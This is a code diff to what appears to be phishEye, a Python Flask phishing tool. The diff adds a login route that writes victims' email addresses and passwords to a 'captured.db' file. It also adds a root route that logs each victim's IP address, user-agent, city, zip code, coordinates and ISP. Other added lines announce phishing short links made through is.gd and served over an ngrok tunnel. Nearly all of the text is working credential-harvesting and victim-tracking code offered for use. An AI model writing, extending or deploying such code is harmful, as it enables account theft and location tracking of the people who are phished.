@@ -30,7 +30,8 @@ try:
    
    # A decorator used to tell the application
    # which URL is associated function
-   @app.route('/', methods =["GET", "POST"])
+   victim_list = []
+   @app.route('/login', methods =["POST"])
    def submit():
       if request.method == "POST":
          # getting input with name = fname in HTML form
@@ -45,13 +46,34 @@ try:
             f = open("captured.db", "w")
             f.write(site.replace('https://www.','') + "|  ID : " + email + "  " + " |   Password: " + password + "\n-------------------------------------------------------------------------------------------------------\n")
             f.close()
-         print(" [ * ] phished id:", email, "password:", password)   
+         print(f" [ * ] Victim {len(victim_list)} account id:", email, "password:", password)   
          print(" [ + ] saved in captured.db")   
+         print("\n [ * ] Waiting for other victim to open the link...")   
          return redirect(site)
 
       return render_template("index.html")
 
-   
+   @app.route('/', methods =["GET", "POST"])   
+   def victimInfo():
+      if request.method == "POST":
+         victim_data = request.json
+         if victim_data["status"] == "fail":
+            print(" [ - ] An error occurred when retrieving victim data :-(")
+         else:   
+            victim_list.append(victim_data["query"])
+            print("\n [ * ] An victim found !")
+            print(f" [ + ] Victim {len(victim_list)} IP: "+ victim_data["query"])
+            print(f" [ + ] Victim {len(victim_list)} user-agent: "+ victim_data["useragent"])
+            print(f" [ + ] Victim {len(victim_list)} continent: "+ victim_data["continent"])
+            print(f" [ + ] Victim {len(victim_list)} region name: "+ victim_data["regionName"])
+            print(f" [ + ] Victim {len(victim_list)} city: "+ victim_data["city"])
+            print(f" [ + ] Victim {len(victim_list)} district: "+ victim_data["district"])
+            print(f" [ + ] Victim {len(victim_list)} zip code: "+ victim_data["zip"])
+            print(f" [ + ] Victim {len(victim_list)} latitude and longitude:",victim_data["lon"],",",victim_data["lon"])
+            print(f" [ + ] Victim {len(victim_list)} ISP: "+ victim_data["isp"])
+            print(f"\n [ * ] Waiting for credentials...")
+      return render_template("index.html")
+
    def is_connected():
       try:
          host = socket.gethostbyname("1.1.1.1")
@@ -68,9 +90,10 @@ try:
          x = requests.get(f'https://is.gd/create.php?format=json&url={url}')
          r = x.json()
          print(" [ * ] Phishing short link: "+alias+"@"+r["shorturl"].replace("https://",""))
+         print('\n [ * ] Waiting for victim to open the link...')
       except:
          if(is_connected()):
-            print("Short url error!!!\nPlease make an issue on github (https://github.com/sky9262/phishEye)")  
+            print(" [ ! ] Short url error!!!\n [ ! ] Please make an issue on github (https://github.com/sky9262/phishEye)")  
          else:
             print("You don't have internet connection for short url!!!")   
 
@@ -79,6 +102,8 @@ try:
     url = ngrok.connect(port,bind_tls=True).public_url
     print(' [ * ] Ngrok public address: ', url)
     short(url,site)
+    print("\n============================ Ready To Go ============================")
+    print('\n [ * ] Waiting victim to open the link...')
 
    if __name__=='__main__':
       parser = argparse.ArgumentParser()
